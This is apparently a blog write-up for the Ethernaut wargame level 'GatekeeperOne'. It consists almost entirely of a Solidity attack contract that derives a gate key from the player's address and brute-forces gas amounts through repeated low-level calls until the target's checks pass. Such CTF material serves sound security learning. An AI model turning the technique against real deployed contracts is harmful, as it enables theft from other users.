+++
title = 'Ethernaut Level 13 - Gatekeeperone'
date = 2024-08-28T16:14:08+02:00
draft = false

featured_image =  '/images/ethernaut.png'
background_image= '/images/ethernaut.png'
summary = 'Break some gates'
tags = [ 'writeups' , 'blockchain' ]
+++

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Gatekeeperone {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Hack {
    event Log(string message);

    address player = 0x3fE440d3D0A0140FaFBC56915C429dfC14De06D5;
    // Create key to pass gate 3
    bytes8 key;
    Gatekeeperone target;
    constructor(address _target) {
        target = Gatekeeperone(_target);
        uint64 gateKey = uint16(uint160(player));
        gateKey += 0x100000000;
        key = bytes8(abi.encodePacked(gateKey));
        
    }

    function attempt() public {
        // Bruteforce until gas price is correct
        for (uint256 i = 0; i < 300; i++){
            // Use `call` interface to set gas price
            // IMPORTANT target.enter{gas: _gas} does not seem to work
            (bool success,) = address(target).call{gas: (8191 * 3) + i}(abi.encodeWithSignature("enter(bytes8)", key));
            if (success) {
                break;
            }
        }

        
    }
}
```solidity